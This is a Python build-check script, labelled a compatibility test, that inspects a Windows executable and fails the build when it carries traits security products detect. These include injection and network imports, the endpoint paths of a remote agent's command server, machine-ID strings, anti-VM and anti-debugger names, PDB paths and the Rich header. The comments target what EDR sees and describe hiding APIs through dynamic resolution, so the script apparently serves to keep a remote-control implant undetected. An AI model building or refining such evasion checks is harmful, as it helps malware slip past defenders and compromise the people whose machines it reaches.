# -*- coding: utf-8 -*-
"""verify_compat.py —— 兼容性适配判据实测（构建后验收）

判据分三层：
  A. IAT：导入表里不应出现网络/TLS/加密/外壳类敏感 DLL 与 API 名
  B. 字符串：二进制里不应出现明文特征（URL 路径、注册表键、工具名、厂商串…）
  C. 结构：PE 富头、调试路径、调试目录、节名、TLS 回调等

用法：
    python verify_compat.py <exe路径> [--json 结果.json]
退出码：0 = 全部判据通过；1 = 有判据未通过
"""
import argparse
import json
import re
import subprocess
import sys

try:
    import pefile
except ImportError:
    print("需要 pefile：pip install pefile")
    sys.exit(2)

# ── 判据定义 ────────────────────────────────────────────────────────────────
# A. 导入表里不应出现的模块（这些一出现就是高置信度静态特征）
BANNED_IMPORTS = [
    b"WININET.dll", b"WINHTTP.dll", b"CRYPT32.dll", b"URLMON.dll",
    b"SHELL32.dll", b"WLDAP32.dll", b"OLEAUT32.dll",
]
# A2. 导入表里不应出现的具体 API（模块没被禁但单项也是特征）
BANNED_APIS = [
    b"InternetOpenA", b"InternetOpenW", b"InternetConnectA", b"InternetConnectW",
    b"HttpOpenRequestA", b"HttpOpenRequestW", b"HttpSendRequestA", b"HttpSendRequestW",
    b"InternetReadFile", b"InternetCrackUrlA", b"InternetCrackUrlW",
    b"InternetQueryOptionA", b"InternetSetOptionA", b"InternetCloseHandle",
    b"CryptProtectData", b"CryptUnprotectData", b"CryptGenRandom",
    b"CryptAcquireContextW", b"CryptCreateHash", b"CryptHashData", b"CryptGetHashParam",
    b"ShellExecuteExW", b"ShellExecuteExA", b"SHGetFolderPathW",
    b"GetAdaptersInfo", b"RegQueryValueExW", b"RegOpenKeyExW", b"RegSetValueExW",
    b"WNetAddConnection", b"URLDownloadToFile", b"WinExec",
    b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread",
    b"SetWindowsHookEx", b"QueueUserAPC", b"NtCreateThreadEx",
]
BANNED_STRINGS_ASCII = [
    b"r6m.ini", b"X-Agent-Key", b"X-Agent-HWID", b"agent_key",
    b"/api/agent/register", b"/api/agent/poll", b"/api/agent/result",
    b"/api/heartbeat", b"/api/health", b"/api/plugins", b"/api/runtime",
    b"/api/files/get",
    b"RemoteIPv6Manager", b"RemoteClient", b"r6m-cfg-", b"client.log",
    b"MachineGuid", b"SOFTWARE\\Microsoft\\Cryptography",
    b"CryptProtectData", b"CryptUnprotectData",
    b"InternetOpenA", b"HttpSendRequestA", b"wininet.dll",
    b"IntegrityCheck", b"StubCore", b"Compat.cpp", b"obfuscate_strings",
    b"vboxservice", b"vboxtray", b"vmtoolsd", b"vmwaretray", b"vmsrvc",
    b"x64dbg.exe", b"ida64.exe", b"ProcessHacker.exe", b"procmon64.exe",
    b"wireshark.exe", b"fiddler.exe", b"frida-server", b"SbieDll.dll",
    b"ImmunityDebugger.exe", b"Cheat Engine", b"WinDbg", b"OllyDbg",
    b"VBoxMouse.sys", b"vmhgfs.sys", b"vmmouse.sys", b"qemu-ga.sys",
    b"MALTEST", b"WSANDBOX", b"HAL9TH", b"TEQUILA", b"USER-PC",
    b"\x2fapi\x2f", b"http://", b"https://[",
]
# B2. 十六进制形态的 pin（全零占位符与配置后的标识都不该以明文出现）
BANNED_STRINGS_UTF16 = [
    "RemoteClient", "r6m.ini", "agent_key", "api.r6m",
]
# C. 结构类判据
BAD_SECTION_NAMES = [b".upx", b".aspack", b".adata", b".vmp", b".themida"]


def scan(path, do_json=None):
    pe = pefile.PE(path, fast_load=True)
    pe.parse_data_directories(directories=[
        pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_IMPORT"],
        pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_DEBUG"],
        pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_TLS"],
        pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_RESOURCE"],
        pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"],
    ])
    raw = open(path, "rb").read()

    report = {"file": path, "size": len(raw), "checks": [], "warn": []}

    def check(name, ok, detail):
        report["checks"].append({"name": name, "pass": bool(ok), "detail": detail})

    # ── A. 导入表 ──
    imported_modules, imported_apis = [], []
    if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            imported_modules.append(entry.dll)
            for imp in entry.imports:
                if imp.name:
                    imported_apis.append(imp.name)

    hit_mod = [m for m in BANNED_IMPORTS if m.upper() in [x.upper() for x in imported_modules]]
    check("A1 敏感导入模块", not hit_mod,
          f"命中 {hit_mod}" if hit_mod else f"导入模块共 {len(imported_modules)} 个，无敏感项")

    hit_api = sorted(set(a for a in BANNED_APIS if a in imported_apis))
    check("A2 敏感导入 API（按名字）", not hit_api,
          f"命中 {[x.decode() for x in hit_api]}" if hit_api else f"导入 API 共 {len(imported_apis)} 个，无敏感项")

    # 按字节再扫一遍导入名区域（防止序号导入兼容处理）
    byte_hits = [a for a in BANNED_APIS if a in raw]
    check("A3 导入名残留在文件里", not byte_hits,
          f"文件字节里命中 {[x.decode() for x in byte_hits][:10]}" if byte_hits else "无残留")

    # ── B. 明文字符串 ──
    hits = [s for s in BANNED_STRINGS_ASCII if s in raw]
    check("B1 明文特征（ASCII）", not hits,
          f"命中 {[h.decode('latin1') for h in hits][:12]}（共 {len(hits)}）" if hits else "0 命中")

    utf16 = raw.decode("utf-16-le", errors="ignore")
    uhits = [s for s in BANNED_STRINGS_UTF16 if s in utf16]
    check("B2 明文特征（UTF-16）", not uhits, f"命中 {uhits}" if uhits else "0 命中")

    # ── C. 结构 ──
    bad_sec = [s.Name.rstrip(b"\x00") for s in pe.sections
               if s.Name.rstrip(b"\x00").lower() in BAD_SECTION_NAMES]
    check("C1 节名（壳特征）", not bad_sec, f"命中 {bad_sec}" if bad_sec else
          f"节：{[s.Name.rstrip(chr(0).encode()).decode('latin1') for s in pe.sections]}")

    has_debug = hasattr(pe, "DIRECTORY_ENTRY_DEBUG") and len(pe.DIRECTORY_ENTRY_DEBUG) > 0
    check("RMM 调试目录", not has_debug, "存在 DEBUG 目录（含 PDB 路径）" if has_debug else "无 DEBUG 目录")

    # 调试路径（独立判据：即便删了 DEBUG 目录，字符串可能还在）
    pdb = re.findall(rb"[A-Za-z]:\\\\?[^\x00]{0,120}\.pdb", raw)
    pdb += re.findall(rb"[A-Za-z]:\\[^\x00]{0,120}\.pdb", raw)
    check("C3 PDB 调试路径", not pdb, f"命中 {pdb[:3]}" if pdb else "0 命中")

    # Rich Header：pefile 不同版本属性名/形态不同，统一用"原始字节里是否出现
    # "Rich" 签名 + 加密的 "DanS" 标记"来判断，不依赖 pefile 版本。
    pe_off = pe.DOS_HEADER.e_lfanew
    region = raw[0x40:pe_off]
    rich_present = False
    ri = region.rfind(b"Rich")
    if ri >= 0 and ri + 8 <= len(region):
        key = int.from_bytes(region[ri + 4:ri + 8], "little")
        rest = region[:ri]
        dec = bytes((b ^ (key & 0xFF)) for b in rest) if key else b""
        rich_present = b"DanS" in dec
    check("C4 PE 富头（工具链标识）", not rich_present,
          "存在 Rich Header（含工具链版本标识）" if rich_present else "已清除")

    # ── D. 版本信息 ──
    # 不要用 pefile.VS_VERSIONINFO 判定：实测它对**合法**资源也只解析出根条目、
    # 拿不到任何字符串，会误报"字符串资源为空"。改用 Windows 自己的版本资源
    # 解析器（Get-Item 的 VersionInfo）—— 那才是 EDR 侧看到的结果。
    ver = []
    try:
        ps = ("$v=(Get-Item '" + path + "').VersionInfo; "
              "Write-Output ($v.CompanyName + '|' + $v.FileDescription + '|' + "
              "$v.FileVersion + '|' + $v.ProductName + '|' + $v.OriginalFilename)")
        rr = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                            capture_output=True, text=True, encoding="utf-8", errors="replace")
        line = (rr.stdout or "").strip()
        keys = ["CompanyName", "FileDescription", "FileVersion", "ProductName", "OriginalFilename"]
        if line:
            for k, v in zip(keys, line.split("|")):
                if v:
                    ver.append((k, v))
    except FileNotFoundError:
        ver = [("(skipped)", "no powershell")]
    report["version_info"] = ver
    check("D1 版本信息/字符串资源", bool(ver) and ver[0][0] != "(skipped)",
          ("；".join(f"{k}={v}" for k, v in ver) if ver else
           "四项全空 —— 该 exe 在 EDR 侧像「无元数据的裸二进制」，是加分项的可疑特征。"
           "排查顺序：rc.exe 是否带 /I；project() 是否 LANGUAGES CXX RC；"
           ".res 是否进了链接命令行（见 tools/check_version.py）"))

    report["imports"] = {
        "modules": [m.decode() for m in imported_modules],
        "api_count": len(imported_apis),
    }
    report["passed"] = all(c["pass"] for c in report["checks"])
    if do_json:
        with open(do_json, "w", encoding="utf-8") as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
    return report


# ── 已知残余（已定位、有解释、当前不处理的项）────────────────────────────
# 放在这里是为了让输出自带解释：下一个人看到 FAIL 时，能立刻知道这是
# "已经查清的已知项"还是"还没做完的活"。
KNOWN_RESIDUAL = [
    "SHELL32.dll 仍被静态导入：CommandLineToArgvW 在部分 Windows 版本上位于 shell32，"
    "它是几乎所有程序都在用的普通 API；同 dll 的 ShellExecuteExW / SHGetFolderPathW "
    "已改为动态解析。要继续消除可改按序号解析 shell32 的这两个导出。",
    "HttpSendRequestA / CryptGenRandom 以**名字**出现在文件里：来源是 .rdata 的函数名"
    "字符串池（WinInet/CryptoAPI 的动态解析依赖名字，但它们**不在导入表**里）。"
    "彻底消除需要按导出序号解析 + 名字加解密，属于下一步可选项。",
    "IntegrityCheck / StubCore 等模块名：来自 C++ 的 __FILE__ 宏与 LOG_*(\"StubCore\", ...) 的"
    "组件名参数。消除是纯机械工作（零风险、收益也低），未做。",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("exe")
    ap.add_argument("--json", default=None)
    ap.add_argument("--no-fail", action="store_true",
                    help="判据未全部通过也返回 0（构建流水线用：只报告不阻断）")
    a = ap.parse_args()
    r = scan(a.exe, a.json)
    print(f"══ 兼容性适配判据实测：{r['file']}（{r['size']} 字节）══")
    for c in r["checks"]:
        print(f"  [{'PASS' if c['pass'] else 'FAIL'}] {c['name']}: {c['detail']}")
    for w in r["warn"]:
        print(f"  [WARN] {w}")
    print(f"── 导入模块：{', '.join(r['imports']['modules'])}")
    print(f"── 导入 API 数：{r['imports']['api_count']}")
    if not r["passed"]:
        print("── 已知残余（已定位、有解释，不是未处理项）──")
        for i, k in enumerate(KNOWN_RESIDUAL, 1):
            print(f"  ({i}) {k}")
    print("══ 结论：" + ("全部判据通过" if r["passed"] else "存在未通过判据（见上方已知残余说明）") + " ══")

    if r["passed"]:
        return 0
    return 0 if a.no_fail else 1


if __name__ == "__main__":
    sys.exit(main())
